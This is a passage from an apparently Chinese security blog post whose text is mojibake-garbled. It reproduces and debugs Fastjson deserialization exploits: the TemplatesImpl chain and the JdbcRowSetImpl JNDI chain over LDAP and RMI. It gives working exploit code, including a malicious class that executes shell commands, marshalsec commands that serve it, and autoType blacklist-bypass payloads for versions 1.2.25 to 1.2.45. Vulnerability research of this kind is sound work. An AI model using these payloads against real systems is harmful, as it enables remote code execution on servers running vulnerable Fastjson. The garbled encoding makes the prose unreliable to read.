<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183521907.png"></p>
<p>ç„¶åè°ƒç”¨äº†<code>MethodAccessor.invoke(obj, args)</code>ï¼Œç»§ç»­å¼ºåˆ¶è¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183804174.png"></p>
<p>ç»§ç»­å¼ºåˆ¶è¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183833536.png"></p>
<p>ç»§ç»­å¼ºåˆ¶è¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183909869.png"></p>
<p>åœ¨<code>getOutputProperties()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>newTransformer().getOutputProperties()</code>æ–¹æ³•ï¼Œè·Ÿè¿›<code>newTransformer()</code>æ–¹æ³•ï¼š</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184004866.png" style="zoom:80%;">

<p>ç„¶åè·Ÿè¿›<code>getTransletInstance()</code>æ–¹æ³•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184116972.png"></p>
<p>åœ¨<code>defineTransletClasses()</code>æ–¹æ³•ä¸­ï¼Œä¼šæ ¹æ®<code>_bytecodes</code>çš„å€¼ç”Ÿæˆ<code>EvilClass</code>ç±»</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184220452.png"></p>
<p>è·Ÿè¿›<code>defineTransletClasses()</code>å‡½æ•°çœ‹çœ‹ï¼Œå‘ç°ä¼šè°ƒç”¨<code>_tfactory.getExternalExtensionsMap()</code>å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬çš„jsonæ•°æ®ä¸­æœ‰<code>_tfactory</code>è¿™ä¸ªå‚æ•°ï¼Œå¦åˆ™ä¸ºnullä¼šå¯¼è‡´æŠ¥é”™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231129115507245.png"></p>
<p>ç»§ç»­çœ‹<code>defineTransletClasses()</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿˜ä¼šåˆ¤æ–­æ¶æ„ç±»æ˜¯å¦ç»§æ‰¿äº†<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚æ‰€ä»¥<code>EvilClass</code>ç±»çš„ä»£ç ä¸­ç»§æ‰¿äº†<code>AbstractTranslet</code>ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231129122117742.png"></p>
<p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆè§£æåˆ°<code>class TemplatesImpl_Exploit.EvilClass</code>ç±»äº†ï¼š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184738079.png"></p>
<p>åé¢å°±æ˜¯EvilClassç±»çš„å®ä¾‹åŒ–è¿‡ç¨‹ï¼Œè¿‡ç¨‹ä¸­ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œå¹¶å¼¹å‡ºè®¡ç®—å™¨</p>
<p>æœ€åçš„è°ƒç”¨è¿‡æ»¤å†å…·ä½“è¯´ä¸‹ï¼šåœ¨<code>getTransletInstance()</code>å‡½æ•°ä¸­è°ƒç”¨äº†<code>defineTransletClasses()</code>å‡½æ•°ï¼Œåœ¨<code>defineTransletClasses()</code>å‡½æ•°ä¸­ä¼šæ ¹æ®<code>_bytecodes</code>æ¥ç”Ÿæˆä¸€ä¸ªJavaç±»ï¼ˆè¿™é‡Œä¸ºæ¶æ„ç±»<code>EvilClass</code>ï¼‰ï¼Œè¯¥ç±»æ„é€ æ–¹æ³•ä¸­å«æœ‰å‘½ä»¤æ‰§è¡Œä»£ç ï¼Œç”Ÿæˆçš„Javaç±»éšåä¼šè¢«<code>newInstance()</code>æ–¹æ³•è°ƒç”¨ç”Ÿæˆä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œä»è€Œè¯¥ç±»çš„æ„é€ å‡½æ•°è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œè¿›è€Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾"><a href="#åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾"></a>åŸºäº<code>JdbcRowSetImpl</code>çš„åˆ©ç”¨é“¾</h3><p>åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾ä¸»è¦æœ‰ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼Œå³<code>JNDI+RMI</code>å’Œ<code>JNDI+LDAP</code>ï¼Œéƒ½æ˜¯å±äºåŸºäº<code>Bean Property</code>ç±»å‹çš„JNDIçš„åˆ©ç”¨æ–¹å¼ã€‚</p>
<h4 id="é™åˆ¶æ¡ä»¶-1"><a href="#é™åˆ¶æ¡ä»¶-1" class="headerlink" title="é™åˆ¶æ¡ä»¶"></a>é™åˆ¶æ¡ä»¶</h4><p>ç”±äºæ˜¯åˆ©ç”¨JNDIæ³¨å…¥æ¼æ´æ¥è§¦å‘çš„ï¼Œå› æ­¤ä¸»è¦çš„é™åˆ¶å› ç´ æ˜¯JDKç‰ˆæœ¬ã€‚</p>
<p>åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;=6u141ã€7u131ã€8u121ï¼ŒåŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;=6u211ã€7u201ã€8u191</p>
<p>ç¬”è€…æ­¤å¤„ç”¨çš„æ˜¯7u76</p>
<h4 id="JNDI-LDAPå¤ç°"><a href="#JNDI-LDAPå¤ç°" class="headerlink" title="JNDI+LDAPå¤ç°"></a>JNDI+LDAPå¤ç°</h4><p>æ–°å»ºä¸€ä¸ªç±»<code>JdbcRowSetImpl_EXP.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/EvilClass\", \"autoCommit\":true}"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦å¤–æ–°å»ºä¸€ä¸ª Maven é¡¹ç›®ï¼Œjdk é€‰æ‹© 7u76ï¼Œå…¶å®ƒä»€ä¹ˆéƒ½ä¸ç”¨åŠ¨ï¼Œç„¶åæ–°å»ºä¸€ä¸ªç±»<code>EvilClass.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">}</span>
                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/hacked"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">EvilClass</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿è¡Œ<code>EvilClass.java</code>ï¼Œä¼šåœ¨<code>target\classes\</code>ç”Ÿæˆ<code>EvilClass.class</code>æ–‡ä»¶ï¼Œåœ¨æ­¤ç›®å½•å¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084122598.png"></p>
<p>ç„¶ååˆ©ç”¨ååºåˆ—åŒ–å·¥å…·<code>marshalsec</code>ï¼Œå¼€ä¸€ä¸ªLDAPæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#EvilClass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿è¡Œ<code>JdbcRowSetImpl_EXP.java</code>ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œæœ‰æŠ¥é”™ä½†ä¸å½±å“</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084522702.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084811872.png"></p>
<h4 id="JNDI-RMIå¤ç°"><a href="#JNDI-RMIå¤ç°" class="headerlink" title="JNDI+RMIå¤ç°"></a>JNDI+RMIå¤ç°</h4><p>ä¿®æ”¹<code>JdbcRowSetImpl_EXP.java</code>çš„payloadä¸­<code>dataSourceName</code>å€¼ä¸º<code>rmi://127.0.0.1:1099/EvilClass</code></p>
<p>ç”¨marshalsecå¼€å¯ä¸€ä¸ªRMIæœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:9898/#EvilClass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201085349761.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201085726778.png"></p>
<h4 id="è°ƒè¯•åˆ†æ-1"><a href="#è°ƒè¯•åˆ†æ-1" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h4><p>ä»¥RMIä¸ºä¾‹ï¼Œæ–­ç‚¹ä¸‹åœ¨<code>JSON.parse(payload);</code>ï¼Œå‰é¢æ˜¯ç±»ä¼¼çš„ï¼Œç›´å¥”ä¸»é¢˜</p>
<p>åœ¨<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>å¤„ä¼šå¯¹payloadçš„jsonæ•°æ®è¿›è¡Œå¾ªç¯éå†ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶å·²ç»è§£æåˆ°<code>com.sun.rowset.JdbcRowSetImpl</code>ç±»äº†ï¼Œç»§ç»­è¿è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201095253335.png"></p>
<p>æ¥ç€å¯¹<code>JdbcRowSetImpl</code>è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201095607620.png"></p>
<p>æ¥ä¸‹æ¥æœ‰äº›åœ°æ–¹é€šè¿‡ASMæœºåˆ¶åœ¨è¿è¡Œï¼Œä¸å¤ªå¥½è°ƒè¯•äº†ï¼Œæˆ‘ä»¬æå‰åœ¨<code>com.sun.rowset.JdbcRowSetImpl</code>ä¸‹é¢ä¸¤å¤„æ‰“å¥½æ–­ç‚¹ç­‰å®ƒè¿‡æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">com.sun.rowset.JdbcRowSetImpl#setDataSourceName
com.sun.rowset.JdbcRowSetImpl#setAutoCommit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>é¦–å…ˆæ¥åˆ°äº†<code>setDataSourceName()</code>å‡½æ•°å¤„ï¼Œå°†<code>dataSource</code>è®¾ç½®æˆäº†<code>rmi://127.0.0.1:1099/EvilClass</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201102613671.png"></p>
<p>æ¥ç€å†æ¥åˆ°<code>setAutoCommit()</code>å‡½æ•°ï¼Œè¿™é‡Œè·Ÿè¿›<code>connect()</code>å‡½æ•°</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201103025720.png"></p>
<p>è·Ÿè¿›åå‘ç°JNDIçš„ç†Ÿæ‚‰çš„æ³¨å…¥ä»£ç <code>InitialContext.lookup()</code>æ–¹æ³•ï¼Œå…¶å‚æ•°<code>this.getDataSourceName()</code>ä¼šè·å¾—RMIé“¾æ¥ï¼Œä»è€Œå¯¼è‡´JNDIæ³¨å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201103325953.png"></p>
<h3 id="è¡¥ä¸ä¸ç»•è¿‡"><a href="#è¡¥ä¸ä¸ç»•è¿‡" class="headerlink" title="è¡¥ä¸ä¸ç»•è¿‡"></a>è¡¥ä¸ä¸ç»•è¿‡</h3><h4 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h4><p>ä¿®æ”¹ä¸€ä¸‹pom.xmlï¼ŒæŠŠfastjsonç‰ˆæœ¬ä¿®æ”¹ä¸º<code>1.2.41</code>ï¼Œç„¶åé‡æ–°åŠ è½½</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.41<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿è¡Œ<code>JdbcRowSetImpl_EXP.java</code>ï¼Œå‘ç°æŠ¥é”™ï¼Œæç¤ºautoTypeç¦ç”¨äº†<code>com.sun.rowset.JdbcRowSetImpl</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201104752314.png"></p>
<p>è°ƒè¯•ï¼Œå‰é¢æ­¥éª¤å·®ä¸å¤šï¼Œæˆ‘ä»¬ç›´å¥”ä¸»é¢˜<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>ï¼Œdebugåˆ°è¯¥å‡½æ•°ä¸‹ï¼Œå‘ç°å¤šäº†ä¸ªå‡½æ•°<code>checkAutoType()</code>ï¼Œè·Ÿè¿›</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201105217776.png"></p>
<p>å¯ä»¥çœ‹å‡ºæ¥<code>checkAutoType()</code>å‡½æ•°å¢åŠ äº†é»‘ç™½åå•ï¼ŒacceptListä¸ºç™½åå•ï¼ŒdenyListä¸ºé»‘åå•ã€‚ä½ç‰ˆæœ¬Fastjsonç™½åå•éœ€è¦è‡ªå·±è®¾ç½®ï¼Œé»˜è®¤ä¸ºç©ºï¼›é»‘åå•æœ‰å¦‚ä¸‹å›¾çš„23ç»„ï¼Œå‰é¢åˆ†æçš„ä¸¤æ¡åˆ©ç”¨é“¾<code>com.sun.</code>è¢«åŒ…å«åœ¨äº†ç¬¬3ç»„ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201105502189.png"></p>
<p>è¯¥å‡½æ•°è¿˜å¼•å…¥äº†ä¸€ä¸ªå‚æ•°autoTypeSupportï¼Œé»˜è®¤ä¸ºfalseï¼š</p>
<p>å½“<strong>autoTypeSupportä¸ºtrue</strong>æ—¶ï¼Œå…ˆè¿›è¡Œç™½åå•è¿‡æ»¤ï¼ŒåŒ¹é…æˆåŠŸå³å¯åŠ è½½è¯¥ç±»å¹¶è¿”å›ï¼›å¦åˆ™è¿›è¡Œé»‘åå•è¿‡æ»¤ï¼ŒåŒ¹é…æˆåŠŸç›´æ¥æŠ¥é”™ï¼›ä¸¤è€…çš†æœªåŒ¹é…æˆåŠŸï¼Œåˆ™åŠ è½½è¯¥ç±»ã€‚<strong>å®è§‚ä¸Šç›¸å½“äºé»‘åå•æœºåˆ¶ã€‚é»˜è®¤æ”¾è¡Œï¼Œé»‘åå•è¿‡æ»¤ã€‚</strong><br>å½“<strong>autoTypeSupportä¸ºfalse</strong>æ—¶ï¼Œå…ˆè¿›è¡Œé»‘åå•è¿‡æ»¤ï¼ŒåŒ¹é…æˆåŠŸç›´æ¥æŠ¥é”™ï¼›å†åŒ¹é…ç™½åå•ï¼ŒåŒ¹é…æˆåŠŸå³å¯åŠ è½½è¯¥ç±»å¹¶è¿”å›ï¼›ä¸¤è€…çš†æœªåŒ¹é…æˆåŠŸï¼Œåˆ™æŠ¥é”™ã€‚<strong>å®è§‚ä¸Šç›¸å½“äºç™½åå•æœºåˆ¶ã€‚é»˜è®¤æ‹’ç»ï¼Œç™½åå•æ”¾è¡Œã€‚</strong></p>
<p>å°†autoTypeSupportè®¾ç½®ä¸ºTrueæœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>JVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>å¦‚æœæœ‰ä½¿ç”¨éå…¨å±€ParserConfigåˆ™ç”¨å¦å¤–è°ƒç”¨<code>setAutoTypeSupport(true);</code></li>
</ul>
<p>AutoTypeç™½åå•è®¾ç½®æ–¹æ³•ï¼š</p>
<ul>
<li>JVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>ä»£ç ä¸­è®¾ç½®ï¼š<code>ParserConfig.getGlobalInstance().addAccept(â€œcom.xx.aâ€);</code></li>
<li>é€šè¿‡<code>fastjson.properties</code>æ–‡ä»¶é…ç½®ã€‚åœ¨1.2.25/1.2.26ç‰ˆæœ¬æ”¯æŒé€šè¿‡ç±»è·¯å¾„çš„<code>fastjson.properties</code>æ–‡ä»¶æ¥é…ç½®ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
</ul>
<p>ç»§ç»­è°ƒè¯•ï¼Œå°±ä¼šç”±äºåœ¨<code>checkAutoType()</code>å‡½æ•°ä¸­æœªå¼€å¯autoTypeSupportï¼Œå³é»˜è®¤è®¾ç½®falseçš„åœºæ™¯ä¸‹è¢«é»‘åå•è¿‡æ»¤äº†ï¼Œä»è€Œå¯¼è‡´æŠ›å‡ºå¼‚å¸¸</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201112624676.png"></p>
<h4 id="ç»•è¿‡æ€è·¯"><a href="#ç»•è¿‡æ€è·¯" class="headerlink" title="ç»•è¿‡æ€è·¯"></a>ç»•è¿‡æ€è·¯</h4><p>æ³¨æ„ï¼šä»¥ä¸‹payloadéƒ½æ˜¯<strong>éœ€è¦AutoTypeSupportä¸ºtrue</strong>æ‰èƒ½æˆåŠŸåˆ©ç”¨çš„</p>
<h5 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h5><p>å…ˆä¸Špayloadï¼Œè¯¥payloadé€‚ç”¨äº1.2.25-1.2.41</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/EvilClass"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é€šè¿‡å‰é¢åˆ†ææˆ‘ä»¬çŸ¥é“ï¼Œè™½ç„¶<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>ä¸åœ¨é»‘åå•é‡Œé¢ï¼Œä½†æ˜¯å½“autoTypeSupportä¸ºfalseæ—¶ï¼Œåœ¨é»‘ç™½åå•éƒ½æ— æ³•åŒ¹é…çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯æŠ¥é”™çš„ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ç”¨<code>JdbcRowSetImpl</code>åˆ©ç”¨é“¾çš„ä»£ç è°ƒè¯•ä¸€ä¸‹ï¼Œæ³¨æ„éœ€è¦å¼€å¯AutoTypeSupportï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç å³å¯ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç”±äºç»•è¿‡äº†æ ¡éªŒï¼Œå¾€ä¸‹ä¼šæ‰§è¡Œ<code>TypeUtils.loadClass(typeName, this.defaultClassLoader, false)</code>ï¼Œè·Ÿè¿›</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201114011112.png"></p>
<p>ç„¶åå°±çœŸç›¸å¤§ç™½äº†ï¼Œç¬¬äºŒæ¡†ä¼šæŠŠ<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>è½¬æ¢æˆ<code>com.sun.rowset.JdbcRowSetImpl</code>ï¼Œå³æˆåŠŸç»•è¿‡ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201114208247.png"></p>
<p>å¦å¤–è¿˜æœ‰ä¸¤ç§ç»•è¿‡æ–¹å¼ï¼Œå¯ä»¥è‡ªè¡Œè°ƒè¯•ï¼š</p>
<h5 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1.2.25-1.2.42"></a>1.2.25-1.2.42</h5><p>é€‚ç”¨äº1.2.25-1.2.42</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://127.0.0.1:1099/EvilClass", "autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h5><p>ç¬”è€…æ­¤å¤„è¿˜åœˆå‡ºäº†ç¬¬ä¸€ä¸ªæ¡†ï¼Œå®ƒæ˜¯å¦ä¸€ç§ç»•è¿‡æ–¹å¼ï¼Œpayloadå¦‚ä¸‹ï¼Œé€‚ç”¨äº1.2.25-1.2.43ç‰ˆæœ¬ã€‚ç¬¬ä¸€ä¸ªé€—å·ä¹‹å‰ä¹‹æ‰€ä»¥å¤šäº†ä¸¤ä¸ªç¬¦å·<code>[{</code>ï¼Œæ˜¯å› ä¸ºè¯¥åˆ©ç”¨é“¾åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°ä¸€äº›å…¶ä»–åˆ¤æ–­éœ€è¦ç»•è¿‡ã€‚å…·ä½“è°ƒè¯•å¯ä»¥å°è¯•å»æ‰è¿™ä¸¤ä¸ªç¬¦å·<code>[{</code>ï¼Œæ‰§è¡Œä»£ç è§‚å¯ŸæŠ¥é”™</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://127.0.0.1:1099/EvilClass", "autoCommit":true}

{"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h5><p>é€‚ç”¨äº1.2.25-1.2.45ï¼Œéœ€è¦å­˜åœ¨mybatisçš„jaråŒ…ï¼Œä¸”å…¶ç‰ˆæœ¬éœ€ä¸º3.x.xç³»åˆ—&lt;3.5.0çš„ç‰ˆæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://127.0.0.1:1099/EvilClass"}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="hashé»‘åå•"><a href="#hashé»‘åå•" class="headerlink" title="hashé»‘åå•"></a>hashé»‘åå•</h5><p>ä»1.2.42ç‰ˆæœ¬å¼€å§‹ï¼ŒFastjsonæŠŠåŸæœ¬æ˜æ–‡å½¢å¼çš„é»‘åå•æ”¹æˆäº†å“ˆå¸Œè¿‡çš„é»‘åå•ï¼Œç›®çš„å°±æ˜¯ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶è€…å¯¹å…¶è¿›è¡Œç ”ç©¶ï¼Œæé«˜æ¼æ´åˆ©ç”¨é—¨æ§›ï¼Œä½†æ˜¯æœ‰äººå·²åœ¨Githubä¸Šè·‘å‡ºäº†å¤§éƒ¨åˆ†é»‘åå•åŒ…ç±»ï¼š<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p>é€šè¿‡å¯¹é»‘åå•çš„ç ”ç©¶ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…·ä½“ç‰ˆæœ¬æœ‰å“ªäº›åˆ©ç”¨é“¾å¯ä»¥åˆ©ç”¨ã€‚ä¾‹å¦‚<code>Fastjson &lt; 1.2.66</code>ï¼š</p>
